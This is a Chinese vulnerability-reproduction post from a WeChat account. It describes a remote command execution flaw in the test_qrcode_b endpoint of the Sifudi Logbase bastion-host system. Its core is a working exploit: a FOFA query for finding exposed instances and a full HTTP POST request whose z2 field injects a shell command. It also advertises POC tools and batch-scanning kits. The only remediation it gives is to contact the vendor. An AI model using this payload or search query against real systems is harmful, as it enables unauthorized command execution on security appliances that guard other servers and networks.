#  思福迪Logbase运维安全管理系统test_qrcode_b接口存在远程命令执行漏洞 附POC   
 南风漏洞复现文库   2023-12-18 23:33  
  
@[toc]  
# 思福迪Logbase运维安全管理系统test_qrcode_b接口存在远程命令执行漏洞 附POC  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 思福迪Logbase运维安全管理系统test_qrcode_b接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
思福迪Logbase运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。  
## 2.漏洞描述  
  
思福迪Logbase运维安全管理系统（Logbase SOM）是新一代操作行为管理安全审计系统，通过B/S方式进行管理，其主要功能为实现对运维人员远程操作服务器、网络设备、数据库过程的授权、监控与审计，实现对IT运维过程的全面监管。支持对多种远程维护方式的支持，如字符终端方式（SSH、Telnet、Rlogin）、图形方式（RDP、X11、VNC、Radmin、PCAnywhere）、文件传输（FTP、SFTP）以及多种主流数据库的访问操作。该系统存在远程命令执行漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
思福迪Logbase运维安全管理系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlL4QY2bLL3WibOGBCYibAamC8VgqtaMOGwfLB6vzZTyiaGwBerXkkbBZ9rA/640?wx_fmt=jpeg&from=appmsg "null")  
  
思福迪Logbase运维安全管理系统test_qrcode_b接口存在远程命令执行漏洞  
## 4.fofa查询语句  
  
product="思福迪-LOGBASE"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/bhost/test_qrcode_b  
  
漏洞数据包：  
```
POST /bhost/test_qrcode_b HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: gzip
Connection: close
Host: 127.0.0.1
Referer: https://127.0.0.1/
Content-Length: 23
Content-Type: application/x-www-form-urlencoded

z1=1&z2="|id;"&z3=bhost
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLmlHibr5IBSddPIuFMXWDyNAu68YW1bxvOOIjlqdHkq9MKc8DtF6cL6g/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现92 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLXtysIFicAW5xvUyKicOWXMhtR0697Pcc6JJNZpmTAW20bZEfUYmE1HkQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
**本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLSuYsKSUictXh0HbkMf3WlWyRLxrm579Jnj0SsQt6RcibYB9UpkCAJOFQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLO5Mjj701oOW2wPmibHBUJPSDhdGpsia3TC4qnjlGyialgqx78TAZtScZQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3b66dta4N2dTkbQ7uKRNqlLGC116eHczs6BBd4YKt9qTOCokhWYIffiaYniauiaIo01tzuMndW7HsuQw/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请联系厂商更新：https://www.logbase.cn/  
## 8.往期回顾  
  
[BYTEVALUE 智能流控路由器存在远程命令漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484752&idx=1&sn=9756adfa2df0cc6e6cd22432167b4887&chksm=974b8857a03c01417fdddcba387d23380656cea4f6d84b2ae5bf6cda529af32e2f1f681a798c&scene=21#wechat_redirect)  
  
  
[多家网关-安全设备存在远程命令执行漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484777&idx=1&sn=aeb718a88b7d7f31d93a8f59eaa309f3&chksm=974b886ea03c01784053b4ecfc132f6d4a44a7fa8f00249e181a221b48ce60f3a49a329c86c3&scene=21#wechat_redirect)  
  
  
  
  
